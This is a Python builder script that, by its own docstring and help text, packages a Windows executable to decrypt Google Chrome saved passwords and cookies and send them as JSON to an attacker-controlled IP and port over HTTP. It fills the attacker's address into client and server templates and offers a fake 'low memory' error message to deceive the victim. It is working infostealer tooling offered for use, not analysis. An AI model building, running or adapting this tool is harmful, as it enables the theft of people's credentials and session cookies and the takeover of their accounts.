# -*- coding: utf-8 -*-
"""Creates an Executable that decrypts and sends Chrome passwords and cookies

This script will make use of pyinstaller to create an executable
version of itself.
The executable's functionality is to decrypt Google Chrome
saved passwords and cookies, sending them as a json file to an attacker
through http connection.

Note: To include a custom icon, change the icon for the server or client in the icons directory"""

import os
import shutil
import argparse
import socket
import PyInstaller.__main__

template_dir = "templates"
build_dir = "build"
dist_dir = "dist"
icon_dir = "icons"


def reset_folders():
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    if not os.path.exists(dist_dir):
        os.mkdir(dist_dir)


def create_executable(filename, icon, mode="windowed"):
    PyInstaller.__main__.run([
        '--clean',
        '--onefile',
        f"--{mode}",
        f'--workpath={build_dir}',
        f'--icon={icon_dir}/{icon}',
        f"{build_dir}/{filename}.py",
        f'--distpath={build_dir}/dist',
    ])


def build_client(filename="client", ip_address="127.0.0.1", icon="client.ico", error_bool="1", error_message="None", cookies=False, login=False, port=80):
    reset_folders()
    os.mkdir("build")
    temp_path = f"{template_dir}/{filename}"
    build_path = f"{build_dir}/{filename}.py"
    dist_path = f"{dist_dir}/{filename}"
    if os.path.exists(temp_path):
        with open(temp_path, "r") as f:
            content = f.read()
        content = content.replace("<<IP_ADDRESS>>", f"{ip_address}")
        content = content.replace("<<ERROR_BOOL>>", f"{error_bool}")
        content = content.replace("<<ERROR_MESSAGE>>", f"{error_message}")
        content = content.replace("<<COOKIES_BOOL>>", f"{cookies}")
        content = content.replace("<<LOGIN_BOOL>>", f"{login}")
        content = content.replace("<<PORT>>", f"{port}")
        with open(build_path, "w") as f:
            f.write(content)
        create_executable(filename, icon)
        if os.path.exists(dist_path):
            shutil.rmtree(dist_path)
        shutil.copyfile(f"{build_dir}/dist/{filename}.exe",
                        f"{dist_dir}/{filename}.exe")
        if os.path.exists(f"{filename}.spec"):
            os.remove(f"{filename}.spec")
        reset_folders()
        return True
    print(f"[-] Error, file not found: {temp_path}")
    return False


def build_server(filename="server", icon="server.ico", port=80):
    reset_folders()
    os.mkdir("build")
    temp_path = f"{template_dir}/{filename}"
    build_path = f"{build_dir}/{filename}.py"
    dist_path = f"{dist_dir}/{filename}"
    if os.path.exists(temp_path):
        with open(temp_path, "r") as f:
            content = f.read()
        content = content.replace("<<PORT>>", f"{port}")
        with open(build_path, "w") as f:
            f.write(content)
        create_executable(filename, icon, mode="console")
        if os.path.exists(dist_path):
            shutil.rmtree(dist_path)
        shutil.copyfile(f"{build_dir}/dist/{filename}.exe",
                        f"{dist_dir}/{filename}.exe")
        if os.path.exists(f"{filename}.spec"):
            os.remove(f"{filename}.spec")
        reset_folders()
        return True
    print(f"[-] Error, file not found: {temp_path}")
    return False


def show_options():
    try:
        pass
    except PermissionError as e:
        os.system("cls")
        filename = str(e).split(" ")[-1]
        print(f"[-] Can't access file, make sure it's closed: {filename}")


def build_message(server, client):
    os.system("cls")
    if not server:
        print(f"[-] Error building the server")
    if not client:
        print(f"[-] Error building the client")
    if server and client:
        print(
            f"[+] Build was successful. The file(s) should be in the directory: {dist_dir}")


def check_valid_port(port):
    try:
        port = int(port)
        if 0 < port < 65535:
            return port
        raise argparse.ArgumentTypeError(
            f"Port {port} is invalid. Please use numbers between 1 and 65534")
    except ValueError:
        raise ValueError(f"Port needs to be an integer")


def parse_arguments():
    error_message = "There isn't enough memory to complete this action. Try using less data or closing other applications."
    parser = argparse.ArgumentParser(
        description='Creates a server and client to steal credentials and cookies from Chrome')
    parser.add_argument('--ip', metavar="IP", type=str, default="127.0.0.1",
                        help="IP address to connect to, or reverse dns. Default is 127.0.0.1")
    parser.add_argument('--port', metavar="PORT", type=check_valid_port, default=80,
                        help="Port to host the server, deafult is 80")
    parser.add_argument('--error', dest="error_bool",
                        action="store_true", default=False, help="Use this to enable the error message. Default is False")
    parser.add_argument('--message', metavar="Error Message",
                        type=str, help="Use to set the error message. The default is low memory error.", default=error_message)
    parser.add_argument('--cookies', dest="cookies_bool",
                        action="store_true", default=False, help="Use to set only cookies to be stolen. Default is both login and cookies")
    parser.add_argument('--login', dest="login_bool",
                        action="store_true", default=False, help="Use to set only login details to be stolen. Default is both login and cookies")
    parser.add_argument('--client', dest="client",
                        action="store_true", default=False, help="Use to only build the client. Default is both client and server")
    parser.add_argument('--server', dest="server",
                        action="store_true", default=False, help="Use to only build the server. Default is both client and server")

    args = parser.parse_args()
    try:
        socket.gethostbyname(args.ip)
    except:
        print("The ip address is wrong, please try again")
        return False
    server = True
    client = True
    if not args.cookies_bool and not args.login_bool:
        args.cookies_bool = True
        args.login_bool = True
    if args.server and not args.client:
        server = build_server(port=args.port)
    elif args.client and not args.server:
        client = build_client(ip_address=args.ip, error_bool=args.error_bool,
                              error_message=args.message, cookies=args.cookies_bool, login=args.login_bool, port=args.port)
    else:
        server = build_server(port=args.port)
        client = build_client(ip_address=args.ip, error_bool=args.error_bool,
                              error_message=args.message, cookies=args.cookies_bool, login=args.login_bool, port=args.port)
    build_message(server, client)


if __name__ == "__main__":
    parse_arguments()
